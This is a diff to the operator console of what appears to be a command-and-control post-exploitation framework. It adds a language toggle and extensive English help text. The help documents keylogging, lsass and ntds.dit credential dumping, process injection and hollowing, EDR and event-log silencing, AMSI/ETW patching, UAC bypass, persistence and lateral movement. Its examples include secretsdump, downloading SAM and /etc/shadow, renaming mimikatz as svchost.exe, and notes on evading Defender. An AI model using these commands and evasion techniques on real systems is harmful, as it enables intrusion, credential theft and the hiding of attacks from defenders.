@@ -132,6 +132,10 @@ tr.selected td{background:rgba(0,212,255,.06)}
 #tab-ps,#tab-fx{flex-direction:column}
 .sleep-cell:hover{color:var(--accent)}
 .console-help{margin:0;font-size:11px;line-height:1.6;flex:1}
+.help-lang-toggle{display:inline-flex;gap:2px;margin-top:6px;user-select:none}
+.help-lang-toggle span{padding:1px 7px;border-radius:3px;border:1px solid var(--border);color:var(--text3);font-size:10px;cursor:pointer;transition:all .15s}
+.help-lang-toggle span.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.help-lang-toggle span:not(.active):hover{border-color:var(--accent);color:var(--accent)}
 #console-drag-handle{height:5px;cursor:ns-resize;background:var(--accent2);transition:background .15s;flex-shrink:0}
 #console-drag-handle:hover,#console-drag-handle.dragging{background:var(--accent)}
 #console-input-row{display:flex;align-items:center;padding:6px 10px;border-top:1px solid var(--border);gap:8px}
@@ -2163,6 +2167,16 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 // ── State ──────────────────────────────────────────────────────────────────────
 let BASE = '';
 let TOKEN = '';
+let helpLang = localStorage.getItem('helpLang') || 'en';
+function helpLangToggleHTML() {
+  return `\n<span class="help-lang-toggle"><span class="${helpLang==='en'?'active':''}">EN</span><span class="${helpLang==='es'?'active':''}">ES</span></span>`;
+}
+function setHelpLang(lang, agentID) {
+  helpLang = lang;
+  localStorage.setItem('helpLang', lang);
+  const _isWin = !agents.find(x=>x.id===agentID)?.os?.toLowerCase().includes('linux');
+  addConsoleHelp(getHelpHTML(_isWin) + helpLangToggleHTML());
+}
 let OPERATOR = 'operator';
 let agents = [];
 let listeners = [];
@@ -4962,6 +4976,13 @@ function addConsoleHelp(html) {
   const wrap = document.createElement('div');
   wrap.style.cssText = 'margin-bottom:4px';
   wrap.innerHTML = `<div class="console-ts" style="margin-bottom:2px">[${new Date().toLocaleTimeString()}] help</div><pre class="console-help">${html}</pre>`;
+  // wire up language toggle clicks
+  wrap.querySelectorAll('.help-lang-toggle span').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const lang = btn.textContent.toLowerCase();
+      if (lang !== helpLang) setHelpLang(lang, activeAgent?.id);
+    });
+  });
   out.appendChild(wrap);
   out.scrollTop = out.scrollHeight;
 }
@@ -5399,7 +5420,140 @@ function addConsoleCommand(cmd) {
 }
 
 function getHelpHTML(isWin) {
+  return (helpLang === 'es' ? getHelpHTML_es : getHelpHTML_en)(isWin);
+}
+function getHelpHTML_en(isWin) {
   return `<span class="console-section">LOCAL KALI  (!prefix)</span>
+  !&lt;cmd&gt;                             run on Kali, output streamed here
+  !nxc smb &lt;t&gt; -u u -p p            netexec SMB
+  !certipy-ad find -u u@d -p p ...  ADCS vuln scan
+  !bloodhound-python -u u -p p ...  BloodHound collection
+  !impacket-secretsdump d/u:p@t      DCSync / SAM dump
+  !impacket-GetUserSPNs d/u:p ...    Kerberoasting
+  !impacket-wmiexec d/u:p@t &lt;cmd&gt;   remote exec
+  !nmap -sV -p 445,88 &lt;t&gt;           port scan
+
+<span class="console-section">AGENT</span>
+  info                               agent details
+  sysinfo                            full sysinfo (hostname, os, arch, user, pid…)
+  shell &lt;cmd&gt;                        execute shell command
+  sleep &lt;sec&gt; &lt;jitter%&gt;              change beacon interval
+  results [n]                        task result history (default 20)
+  cleanup                            self-delete from disk
+  back                               close console
+  kill                               terminate agent process
+
+<span class="console-section">FILESYSTEM</span>
+  pwd / cd &lt;path&gt; / ls [path]        current dir / change / list
+  mkdir &lt;path&gt; / rm &lt;path&gt;           create / delete
+  cat &lt;file&gt; / env                   read file / environment vars
+
+<span class="console-section">FILE TRANSFER</span>
+  download &lt;remote_path&gt;             agent → server
+  upload &lt;server_file&gt; &lt;remote_path&gt; server → agent
+
+<span class="console-section">RECON</span>
+  ps                                 list processes
+  getpid                             agent process PID
+  ppid                               agent parent process PPID
+  port-scan &lt;target&gt; &lt;ports&gt; [ms]   TCP scan from agent (timeout per port in ms)
+${isWin ? `
+<span class="console-section">COLLECTION</span>
+  screenshot                         screenshot → server
+  screenwatch start [secs] / stop    automatic periodic screenshots (default every 30s)
+  keylog start|stop|dump             WH_KEYBOARD_LL keylogger (system-level keyboard hook)
+  clip                               read clipboard (one-shot)
+  clip-monitor start / dump / stop   monitor clipboard continuously
+  minidump [pid]                     dump process to .dmp and download; no pid → lsass.exe
+  ntds-dump [outdir]                 dump ntds.dit via ntdsutil (requires DA)
+
+<span class="console-section">INJECTION / EXECUTION</span>
+  inject &lt;pid&gt; &lt;sc.bin&gt;             classic injection: WriteProcessMemory + CreateRemoteThread
+  inject-apc &lt;sc.bin&gt; [proc]        APC early-bird: spawn [proc] suspended, inject, resume
+  forkrun &lt;sc.bin&gt; [proc]           PPID-spoof + section map + thread hijack in sacrificial process
+  thread-hijack &lt;pid&gt; &lt;sc.bin&gt;     section map + patch RIP of existing thread (no CreateRemoteThread)
+  stage2 &lt;sc.bin&gt;                   in-process CreateThread (no new process)
+  hollow &lt;target.exe&gt; &lt;sc.bin&gt;     process hollowing: create suspended process, replace image, resume
+  udrl &lt;sc.bin&gt;                     Universal Reflective DLL Loading via phantom load (no WriteProcessMemory)
+
+<span class="console-section">.NET / BOF</span>
+  dotnet-exec &lt;asm.exe&gt; [args]      CLR inline-execute in-process — Rubeus, Seatbelt, SharpHound, etc.
+  dotnet-asm &lt;asm.exe&gt; [proc]       .NET → Donut → APC in sacrificial process (no CLR visible in agent)
+  clrstomp &lt;asm.exe&gt; [args]         .NET without Donut or new process: replace legitimate GAC assembly
+  bof &lt;name|file.o&gt; [args]          execute BOF (COFF x64); name=preinstalled, file.o=uploaded
+  bof list                           list available BOFs on C2 server
+  bof install                        clone/update BOF collections on C2 server
+  bof-store list                     list BOFs loaded in agent memory store
+  bof-store unload &lt;name&gt;            unload BOF from agent memory store
+
+<span class="console-section">EVASION</span>
+  blockdlls on|off                   process policy: block non-Microsoft-signed DLLs
+  edr-silence &lt;pid&gt;                 block EDR outbound traffic via WFP (Windows Filtering Platform)
+  edr-silence-rm &lt;pid&gt;              remove WFP rule for that process
+  eventlog-suspend                   suspend EventLog service (no logs while suspended)
+  eventlog-resume                    resume EventLog
+  peb-spoof &lt;path&gt;                  spoof process in PEB (e.g. C:\\Windows\\System32\\svchost.exe)
+  hook-check                         scan ntdll/kernel32 for EDR hooks (E9/CC/FF25)
+  hw-bp-check                        detect active hardware breakpoints on current thread (DR0–DR3)
+  hwbp-clear                         clear active hardware breakpoints (zero DR0–DR3)
+  mem-fluctuate start [secs]|stop    periodically XOR-mutate agent's internal in-memory buffers
+  encode-uuid &lt;sc.bin&gt;              encode shellcode as UUIDs; outputs C code using UuidFromStringA
+
+<span class="console-section">TOKENS / PRIVESC</span>
+  token whoami                       show current process token
+  token steal &lt;pid&gt;                 impersonate a process token
+  token make &lt;dom\\user&gt; &lt;pass&gt;    create logon token with known credentials
+  token drop                         release impersonated token
+  steal-token &lt;pid&gt;                 alias: impersonate token (OpenProcess + DuplicateTokenEx)
+  make-token &lt;dom\\user&gt; &lt;pass&gt;    alias: create logon token
+  rev2self                           revert to original process token
+  token-store list                   list tokens in the token store
+  token-store use &lt;id&gt;              apply token from store to current thread
+  elevate fodhelper &lt;cmd&gt;           UAC bypass via fodhelper.exe (requires user in Admin group)
+
+<span class="console-section">PERSISTENCE</span>
+  persist                            persistence via HKCU\\Run
+  persist task [name]                persistence via onlogon scheduled task
+  persist rm                         remove active persistence
+  com-hijack &lt;clsid&gt; &lt;dll&gt;         COM key hijacking in HKCU (no elevation required)
+  com-hijack rm &lt;clsid&gt;             remove COM hijack
+  gen-lnk &lt;target&gt; [args] [icon]    generate .lnk file (LNK phishing / autorun)
+
+<span class="console-section">LATERAL MOVEMENT</span>
+  jump psexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMB ADMIN$ + temporary SCM service
+  jump smbexec &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMBExec (in-memory execution, no binary on disk)
+  jump wmi     &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   execute via WMI Win32_Process::Create
+  jump dcom    &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral via DCOM MMC20.Application
+  jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral via ephemeral scheduled task (AT)
+  jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copy + execute via SSH (Linux/Windows)
+  jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copy payload.exe to target and execute via WinRM
+                                                     (≠ winrm deploy: payload is a pre-uploaded .exe)
+  winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          run a single command on remote host via WinRM
+                                                     (no agent deployed — equivalent to wmiexec over WinRM)
+  winrm deploy &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cradle_ps&gt;   execute a PowerShell one-liner/cradle on target via WinRM
+                                                     (≠ jump winrm: payload is PS text, not .exe; useful for
+                                                     IEX download-and-execute without uploading a binary)
+
+<span class="console-section">INTERACTIVE SHELL</span>
+  ishell cmd                         open persistent interactive cmd.exe
+  ishell ps                          open interactive PowerShell
+  ishell exit                        close interactive shell
+` : ''}
+<span class="console-section">PIVOT / TUNNEL</span>
+  socks &lt;port&gt; [user:pass]          SOCKS5 proxy on agent (Go agent)
+  socks stop
+  socks5 start &lt;port&gt;               SOCKS5 proxy on agent (Rust agent)
+  socks5 stop
+  rsocks start [port] [user:pass]   Reverse SOCKS5: agent connects to C2 (useful behind NAT)
+  rsocks stop
+  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  agent port forward: local port → remote host:port
+  portfwd del [tcp|udp] &lt;lport&gt; / portfwd list
+  httpivot start [port] / httpivot stop  HTTP proxy server on agent for proxychains
+${isWin ? `  link start [pipename] / link stop        connect to child agent via SMB named pipe (P2P)` : ''}`;
+}
+
+function getHelpHTML_es(isWin) {
+  return `<span class="console-section">LOCAL KALI  (!prefijo)</span>
   !&lt;cmd&gt;                             ejecutar en Kali, output aquí mismo
   !nxc smb &lt;t&gt; -u u -p p            netexec SMB
   !certipy-ad find -u u@d -p p ...  ADCS vuln scan
@@ -5413,26 +5567,26 @@ function getHelpHTML(isWin) {
   info                               detalles del agente
   sysinfo                            sysinfo completo (hostname, os, arch, usuario, pid…)
   shell &lt;cmd&gt;                        ejecutar comando shell
-  sleep &lt;sec&gt; &lt;jitter%&gt;              cambiar beacon
+  sleep &lt;seg&gt; &lt;jitter%&gt;              cambiar beacon
   results [n]                        historial de resultados (defecto 20)
   cleanup                            auto-eliminar del sistema
   back                               cerrar consola
   kill                               terminar proceso del agente
 
 <span class="console-section">FILESYSTEM</span>
-  pwd / cd &lt;path&gt; / ls [path]        directorio actual / cambiar / listar
-  mkdir &lt;path&gt; / rm &lt;path&gt;           crear / borrar
-  cat &lt;file&gt; / env                   leer archivo / variables de entorno
+  pwd / cd &lt;ruta&gt; / ls [ruta]        directorio actual / cambiar / listar
+  mkdir &lt;ruta&gt; / rm &lt;ruta&gt;           crear / borrar
+  cat &lt;archivo&gt; / env                leer archivo / variables de entorno
 
 <span class="console-section">TRANSFERENCIA</span>
   download &lt;ruta_remota&gt;             agente → servidor
-  upload &lt;server_file&gt; &lt;ruta_remota&gt; servidor → agente
+  upload &lt;nombre_servidor&gt; &lt;ruta_remota&gt; servidor → agente
 
 <span class="console-section">RECONOCIMIENTO</span>
   ps                                 listar procesos
   getpid                             PID del proceso agente
   ppid                               PPID del proceso padre del agente
-  port-scan &lt;target&gt; &lt;ports&gt; [ms]   TCP scan desde el agente (timeout por puerto en ms)
+  port-scan &lt;target&gt; &lt;puertos&gt; [ms]  TCP scan desde el agente (timeout por puerto en ms)
 ${isWin ? `
 <span class="console-section">COLECCIÓN</span>
   screenshot                         captura de pantalla → servidor
@@ -5454,18 +5608,19 @@ ${isWin ? `
 
 <span class="console-section">.NET / BOF</span>
   dotnet-exec &lt;asm.exe&gt; [args]      CLR inline-execute en-proceso — Rubeus, Seatbelt, SharpHound, etc.
-  dotnet-asm &lt;asm.exe&gt; [proc]       .NET → Donut → APC en proceso sacrificial (sin CLR visible)
+  dotnet-asm &lt;asm.exe&gt; [proc]       .NET → Donut → APC en proceso sacrificial (sin CLR visible en agente)
   clrstomp &lt;asm.exe&gt; [args]         .NET sin Donut ni proceso nuevo: sustituye assembly legítimo del GAC
-  bof &lt;nombre|archivo.o&gt; [args]     ejecutar BOF (COFF x64); nombre = preinstalado, archivo.o = subido
-  bof-store load &lt;archivo.o&gt; &lt;nombre&gt;   cargar BOF en store en memoria
-  bof-store list                     listar BOFs en store
-  bof-store unload &lt;nombre&gt;          descargar BOF del store
+  bof &lt;nombre|archivo.o&gt; [args]     ejecutar BOF (COFF x64); nombre=preinstalado, archivo.o=subido
+  bof list                           listar BOFs disponibles en servidor C2
+  bof install                        clonar/actualizar colecciones de BOFs en servidor C2
+  bof-store list                     listar BOFs cargados en la memoria del agente
+  bof-store unload &lt;nombre&gt;          descargar BOF del store en memoria del agente
 
 <span class="console-section">EVASIÓN</span>
   blockdlls on|off                   política de proceso: bloquear DLLs no firmadas por Microsoft
   edr-silence &lt;pid&gt;                 bloquear tráfico saliente del EDR vía WFP (Windows Filtering Platform)
   edr-silence-rm &lt;pid&gt;              eliminar regla WFP para ese proceso
-  eventlog-suspend                   suspender el servicio EventLog (sin generar logs mientras está suspendido)
+  eventlog-suspend                   suspender el servicio EventLog (sin generar logs mientras suspendido)
   eventlog-resume                    reanudar EventLog
   peb-spoof &lt;path&gt;                  enmascarar proceso en PEB (ej: C:\\Windows\\System32\\svchost.exe)
   hook-check                         escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)
@@ -5492,7 +5647,7 @@ ${isWin ? `
   persist rm                         eliminar persistencia activa
   com-hijack &lt;clsid&gt; &lt;dll&gt;         hijacking de clave COM en HKCU (sin elevación)
   com-hijack rm &lt;clsid&gt;             eliminar hijacking COM
-  gen-lnk &lt;target&gt; [args] [icon&gt;]  generar archivo .lnk (LNK phishing / autorun)
+  gen-lnk &lt;target&gt; [args] [icon]    generar archivo .lnk (LNK phishing / autorun)
 
 <span class="console-section">MOVIMIENTO LATERAL</span>
   jump psexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMB ADMIN$ + servicio SCM temporal
@@ -5502,12 +5657,8 @@ ${isWin ? `
   jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral vía schtask efímera (AT)
   jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copia + ejecución vía SSH (Linux/Windows)
   jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copia payload.exe al target y lo ejecuta vía WinRM
-                                                     (≠ winrm deploy: aquí el payload es un .exe ya subido al servidor)
-  winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          ejecutar un comando suelto en host remoto vía WinRM
-                                                     (no despliega agente — equivale a wmiexec pero por WinRM)
-  winrm deploy &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cradle_ps&gt;   ejecutar un PowerShell one-liner/cradle en el target vía WinRM
-                                                     (≠ jump winrm: el payload es texto PS, no un .exe; útil para
-                                                     IEX download-and-execute sin subir binario al servidor)
+  winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          ejecutar comando suelto en host remoto vía WinRM
+  winrm deploy &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cradle_ps&gt;   ejecutar PowerShell one-liner/cradle en target vía WinRM
 
 <span class="console-section">SHELL INTERACTIVA</span>
   ishell cmd                         abrir cmd.exe interactivo persistente
@@ -5521,14 +5672,14 @@ ${isWin ? `
   socks5 stop
   rsocks start [port] [user:pass]   Reverse SOCKS5: el agente conecta al C2 (útil tras NAT)
   rsocks stop
-  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  reenvío de puerto local del agente a host:puerto remoto
+  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  reenvío de puerto del agente a host:puerto remoto
   portfwd del [tcp|udp] &lt;lport&gt; / portfwd list
   httpivot start [port] / httpivot stop  servidor HTTP en el agente para proxychains
 ${isWin ? `  link start [pipename] / link stop        conectar a agente hijo vía named pipe SMB (P2P)` : ''}`;
 }
 
 // Per-command detailed help entries (used by `help <cmd>`)
-const CMD_DETAIL_HELP = {
+const CMD_DETAIL_HELP_ES = {
   'shell': (isWin) => `<b>shell</b> — ejecutar comando en el shell del sistema
 
   <span class="console-section">USO</span>
@@ -5804,12 +5955,16 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
 
   <span class="console-section">USO</span>
   bof &lt;nombre|archivo.o&gt; [args]
+  bof list
+  bof install
 
   <span class="console-section">EJEMPLOS</span>
   bof whoami
   bof klist
   bof ldapsearch "(objectClass=user)" samAccountName
   bof trustedSec/sa_whoami
+  bof list                     → listar BOFs disponibles en servidor C2
+  bof install                  → clonar/actualizar colecciones de BOFs en servidor C2
   upload lateral.o C:\\Temp\\lat.o   → luego: bof C:\\Temp\\lat.o target_host
 
   <span class="console-section">NOTAS</span>
@@ -6289,6 +6444,777 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • El agente sigue ejecutándose en el objetivo`,
 };
 
+const CMD_DETAIL_HELP_EN = {
+  'shell': (isWin) => `<b>shell</b> — execute a command in the system shell
+
+  <span class="console-section">USAGE</span>
+  shell &lt;command&gt;
+
+  <span class="console-section">EXAMPLES</span>
+${isWin ? `  shell whoami /all
+  shell net user /domain
+  shell ipconfig /all
+  shell tasklist /v
+  shell reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run` : `  shell id
+  shell uname -a
+  shell cat /etc/passwd
+  shell ps aux
+  shell netstat -tlnp`}
+
+  <span class="console-section">NOTES</span>
+  • Uses ${isWin ? 'cmd.exe on Windows' : '/bin/sh on Linux'}
+${isWin ? `  • For PowerShell: shell powershell -nop -enc &lt;base64-UTF16LE&gt;
+  • For complex quoting, -enc avoids escape issues` : `  • For redirection: shell bash -c "cmd > /tmp/out.txt"
+  • For pipes: shell bash -c "ps aux | grep nginx"`}`,
+
+  'sleep': `<b>sleep</b> — change the agent beacon interval
+
+  <span class="console-section">USAGE</span>
+  sleep &lt;seconds&gt; &lt;jitter%&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  sleep 30 20       → beacon every 30s ±20% (24–36s)
+  sleep 300 10      → beacon every 5min ±10%
+  sleep 60 0        → beacon every 60s exact (no jitter)
+  sleep 3600 50     → beacon every 1h ±50% (30min–1.5h)
+
+  <span class="console-section">NOTES</span>
+  • Change takes effect on the next beacon
+  • Jitter ≥50% increases evasion but may appear inactive`,
+
+  'info': `<b>info</b> — show current agent details
+
+  <span class="console-section">USAGE</span>
+  info
+
+  <span class="console-section">OUTPUT</span>
+  id, hostname, user, OS, IP, PID, transport (http/mtls), sleep/jitter, last seen`,
+
+  'ps': (isWin) => `<b>ps</b> — list running processes on the target
+
+  <span class="console-section">USAGE</span>
+  ps
+
+  <span class="console-section">OUTPUT</span>
+  PID, PPID, name, user${isWin ? ', arch, integrity' : ''}
+
+  <span class="console-section">NOTES</span>
+${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token steal
+  • System processes (lsass, svchost) require SYSTEM or SeDebugPrivilege` : `  • Useful for identifying target processes
+  • Combine with shell kill &lt;pid&gt; to terminate processes`}`,
+
+  'screenshot': `<b>screenshot</b> — capture screenshot of the target
+
+  <span class="console-section">USAGE</span>
+  screenshot
+
+  <span class="console-section">NOTES</span>
+  • Windows only (Go agent)
+  • Image is automatically downloaded to the server and appears in the Files tab
+  • With multiple monitors, captures the full virtual desktop`,
+
+  'download': `<b>download</b> — download file from agent to C2 server
+
+  <span class="console-section">USAGE</span>
+  download &lt;remote_path&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  download C:\\Users\\victim\\Desktop\\passwords.txt
+  download C:\\Windows\\System32\\config\\SAM
+  download /etc/shadow
+
+  <span class="console-section">NOTES</span>
+  • File is stored on the server, visible in the Files tab
+  • For files locked by the OS (SAM, NTDS.dit) use minidump or VSS`,
+
+  'upload': `<b>upload</b> — upload file from C2 server to agent
+
+  <span class="console-section">USAGE</span>
+  upload &lt;server_filename&gt; &lt;remote_path&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  upload mimikatz.exe C:\\Temp\\svchost.exe
+  upload SharpHound.exe C:\\Users\\Public\\update.exe
+  upload pivot.bin /tmp/pivot.bin
+
+  <span class="console-section">NOTES</span>
+  • &lt;server_filename&gt; is the name of the file already uploaded to the C2 server (Files tab)
+  • First upload the file to the server via the Upload button in Files, then use this command`,
+
+  'inject': `<b>inject</b> — classic injection into existing process
+
+  <span class="console-section">USAGE</span>
+  inject &lt;pid&gt; &lt;sc.bin&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  inject 1234 agent.bin
+  inject 4892 beacon.bin
+
+  <span class="console-section">TECHNIQUE</span>
+  1. VirtualAllocEx in target process
+  2. WriteProcessMemory (shellcode)
+  3. CreateRemoteThread → execution
+
+  <span class="console-section">NOTES</span>
+  • Noisier than inject-apc or thread-hijack
+  • Requires process access (SeDebugPrivilege or same user)
+  • EDRs monitor VirtualAllocEx+WriteProcessMemory+CreateRemoteThread (classic sequence)
+  • For better stealth: use inject-apc (early-bird) or thread-hijack`,
+
+  'inject-apc': `<b>inject-apc</b> — APC early-bird in new sacrificial process
+
+  <span class="console-section">USAGE</span>
+  inject-apc &lt;sc.bin&gt; [sacrificial_process]
+
+  <span class="console-section">EXAMPLES</span>
+  inject-apc agent.bin
+  inject-apc agent.bin svchost.exe
+  inject-apc beacon.bin RuntimeBroker.exe
+
+  <span class="console-section">TECHNIQUE</span>
+  1. Create [proc] suspended (CREATE_SUSPENDED)
+  2. Map section with shellcode (NtCreateSection/NtMapViewOfSection)
+  3. QueueUserAPC → points to shellcode
+  4. ResumeThread → thread executes APC before entry point
+
+  <span class="console-section">NOTES</span>
+  • Default process: svchost.exe
+  • Windows Defender on Server 2022 detects cross-process APC even with exclusions
+  • If Defender is active, use <b>stage2</b> (in-process) instead
+  • Sacrificial process must exist on disk at the standard path`,
+
+  'stage2': `<b>stage2</b> — execute shellcode in the current agent process (in-process)
+
+  <span class="console-section">USAGE</span>
+  stage2 &lt;sc.bin&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  stage2 agent.bin          → new C2 agent in the same process
+  stage2 beacon_cs.bin      → Cobalt Strike beacon in-process
+  stage2 sliver_payload.bin → Sliver implant in-process
+
+  <span class="console-section">TECHNIQUE</span>
+  • VirtualAlloc (RW) → copy shellcode → VirtualProtect (RX) → CreateThread
+  • Runs inside the current agent process (no new process, no cross-process)
+  • Agent already has ETW/AMSI patched → shellcode inherits the clean environment
+
+  <span class="console-section">DIFFERENCES vs inject-apc</span>
+  • inject-apc spawns a new process → detected by Defender behavioral engine
+  • stage2 is in-process → bypasses Defender cross-process detection on Server 2022
+
+  <span class="console-section">NOTES</span>
+  • sc.bin must be pre-uploaded to the server (upload + filename)
+  • Injecting stage2 multiple times in the same agent accumulates Go runtimes → use different agents
+  • Use donut to convert EXEs to shellcode: donut -i payload.exe -o agent.bin`,
+
+  'forkrun': `<b>forkrun</b> — PPID spoof + section map + thread hijack in sacrificial process
+
+  <span class="console-section">USAGE</span>
+  forkrun &lt;sc.bin&gt; [sacrificial_process]
+
+  <span class="console-section">EXAMPLES</span>
+  forkrun beacon.bin
+  forkrun beacon.bin explorer.exe
+
+  <span class="console-section">TECHNIQUE</span>
+  1. Creates sacrificial process with spoofed PPID (appears as child of explorer or lsass)
+  2. Maps RX section
+  3. Patches main thread RIP → executes shellcode without CreateRemoteThread
+
+  <span class="console-section">NOTES</span>
+  • Stealthier than inject: no CreateRemoteThread, no direct WriteProcessMemory
+  • Combines PPID spoofing + thread hijack to reduce IOCs`,
+
+  'thread-hijack': `<b>thread-hijack</b> — section map + patch RIP of existing thread
+
+  <span class="console-section">USAGE</span>
+  thread-hijack &lt;pid&gt; &lt;sc.bin&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  thread-hijack 1234 beacon.bin
+
+  <span class="console-section">TECHNIQUE</span>
+  1. Opens existing process
+  2. Maps section with shellcode (NtCreateSection/NtMapViewOfSection)
+  3. Suspends a process thread
+  4. GetThreadContext → modify RIP → SetThreadContext → ResumeThread
+
+  <span class="console-section">NOTES</span>
+  • No CreateRemoteThread → avoids that specific IOC
+  • Process keeps running (temporary thread hijack)
+  • Requires process access with THREAD_SET_CONTEXT`,
+
+  'dotnet-asm': `<b>dotnet-asm</b> — execute .NET assembly via Donut in sacrificial process
+
+  <span class="console-section">USAGE</span>
+  dotnet-asm &lt;assembly.exe&gt; [sacrificial_process]
+
+  <span class="console-section">EXAMPLES</span>
+  dotnet-asm SharpHound.exe
+  dotnet-asm Seatbelt.exe svchost.exe
+  dotnet-asm Rubeus.exe ksh --tgtdeleg
+
+  <span class="console-section">TECHNIQUE</span>
+  1. Server converts the .NET EXE to shellcode with Donut
+  2. Shellcode injected into [proc] sacrificial via APC early-bird
+  3. .NET runs inside sacrificial process — no CLR visible in agent
+
+  <span class="console-section">NOTES</span>
+  • Requires Donut installed on server (~/.local/bin/donut)
+  • Without a specified process, defaults to svchost.exe
+  • If Defender detects the process, try clrstomp for in-process execution`,
+
+  'dotnet-exec': `<b>dotnet-exec</b> — CLR inline-execute in-process (Rubeus, Seatbelt, SharpHound…)
+
+  <span class="console-section">USAGE</span>
+  dotnet-exec &lt;assembly.exe&gt; [args for the assembly]
+
+  <span class="console-section">EXAMPLES</span>
+  dotnet-exec Rubeus.exe kerberoast /outfile:hashes.txt
+  dotnet-exec Seatbelt.exe -group=all
+  dotnet-exec SharpHound.exe -c All
+  dotnet-exec hellonet.exe
+
+  <span class="console-section">TECHNIQUE</span>
+  • Native in-process CLR via ICorRuntimeHost + AppDomain.Load_3 (no Donut, no sacrificial process)
+  • Captures Console.Write/WriteLine via DirectWriter P/Invoke (direct WriteFile, no buffering)
+  • AMSI and ETW patched before loading the assembly
+  • 3-minute timeout; assembly errors are captured as output
+
+  <span class="console-section">DIFFERENCES vs dotnet-asm / clrstomp</span>
+  dotnet-asm  → Donut + new sacrificial process (CLR invisible in agent)
+  clrstomp    → CLR via legitimate GAC + memory stomping
+  dotnet-exec → CLR directly in agent, full output captured
+
+  <span class="console-section">NOTES</span>
+  • Assembly runs in the agent's default AppDomain
+  • No new process — agent stays alive if assembly hangs (3 min timeout)
+  • Equivalent to: Cobalt Strike execute-assembly / Havoc dotnet inline-execute`,
+
+  'clrstomp': `<b>clrstomp</b> — .NET in-process via CLR stomping (no Donut, no new process)
+
+  <span class="console-section">USAGE</span>
+  clrstomp &lt;assembly.exe&gt; [assembly_args]
+
+  <span class="console-section">EXAMPLES</span>
+  clrstomp Seatbelt.exe -group=all
+  clrstomp SharpUp.exe audit
+  clrstomp Rubeus.exe dump /service:krbtgt
+
+  <span class="console-section">TECHNIQUE</span>
+  1. Loads a legitimate .NET assembly from GAC (e.g. Microsoft.Build.dll)
+  2. Brings CLR into current process via legitimate path
+  3. Overwrites legitimate assembly memory with malicious assembly
+  4. Executes malicious assembly within the same process
+
+  <span class="console-section">DIFFERENCES vs dotnet-asm</span>
+  • No Donut — does not convert to shellcode
+  • No new process — runs in agent process
+  • Legitimate GAC assembly header remains in memory (cover)
+
+  <span class="console-section">NOTES</span>
+  • Requires .NET assembly to be uploaded to server
+  • Stealthier for offensive .NET tool execution`,
+
+  'bof': `<b>bof</b> — execute Beacon Object File (COFF x64)
+
+  <span class="console-section">USAGE</span>
+  bof &lt;name|file.o&gt; [args]
+  bof list
+  bof install
+
+  <span class="console-section">EXAMPLES</span>
+  bof whoami
+  bof klist
+  bof ldapsearch "(objectClass=user)" samAccountName
+  bof trustedSec/sa_whoami
+  bof list                     → list available BOFs on C2 server
+  bof install                  → clone/update BOF collections on C2 server
+  upload lateral.o C:\\Temp\\lat.o   → then: bof C:\\Temp\\lat.o target_host
+
+  <span class="console-section">NOTES</span>
+  • &lt;name&gt; = BOF preinstalled on C2 server (bof/ directory)
+  • &lt;file.o&gt; = previously uploaded with upload command, loaded from disk
+  • BOFs run in-process (no new process) — very stealthy
+  • Args passed as free string; BOF receives C-style argc/argv`,
+
+  'hook-check': `<b>hook-check</b> — detect EDR hooks in ntdll and kernel32
+
+  <span class="console-section">USAGE</span>
+  hook-check
+
+  <span class="console-section">OUTPUT</span>
+  List of functions with modified bytes (E9=JMP, CC=INT3, FF25=JMP [rip+x])
+  Clean functions (no hook)
+
+  <span class="console-section">NOTES</span>
+  • Detects EDR inline hooks intercepting syscalls
+  • Useful to know which functions are monitored before executing techniques
+  • To bypass: use direct syscalls or unhooking`,
+
+  'hw-bp-check': `<b>hw-bp-check</b> — detect active hardware breakpoints
+
+  <span class="console-section">USAGE</span>
+  hw-bp-check
+
+  <span class="console-section">OUTPUT</span>
+  Status of DR0–DR3 (hardware debug registers)
+
+  <span class="console-section">NOTES</span>
+  • Advanced EDRs (CrowdStrike, SentinelOne) may use HW BPs for callbacks
+  • If DR0–DR3 have non-zero addresses, active instrumentation is present
+  • Applies only to the agent's current thread`,
+
+  'mem-fluctuate': `<b>mem-fluctuate</b> — periodically mutate internal buffers against memory scans
+
+  <span class="console-section">USAGE</span>
+  mem-fluctuate start [interval_seconds]
+  mem-fluctuate stop
+
+  <span class="console-section">EXAMPLES</span>
+  mem-fluctuate start 30    → XOR-mutate every 30s
+  mem-fluctuate start       → default interval
+  mem-fluctuate stop
+
+  <span class="console-section">NOTES</span>
